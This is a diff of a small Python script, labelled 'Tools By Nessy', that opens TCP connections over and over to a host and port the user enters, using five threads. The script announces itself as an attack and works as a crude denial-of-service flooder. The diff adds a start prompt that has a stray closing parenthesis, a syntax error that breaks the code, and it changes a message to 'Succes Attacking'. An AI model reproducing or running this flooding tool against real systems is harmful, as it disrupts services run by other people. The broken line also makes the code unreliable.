@@ -6,6 +6,7 @@ import threading
 os.system("cls")
 host = input("\nEnter host: ")
 port = int(input("\nEnter port: "))
+run = input("\nPress Enter To Start "))
 print("Tools By Nessy")
 print("Starting Attack....")
 def run(h):
@@ -13,7 +14,7 @@ def run(h):
         s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
         s.connect((host,port))
         print("Attacking : " + host)
-        print("Succes Send Request")
+        print("Succes Attacking")
 for i in range(5):
     t = threading.Thread(target=run, args=[i])
     t.start()
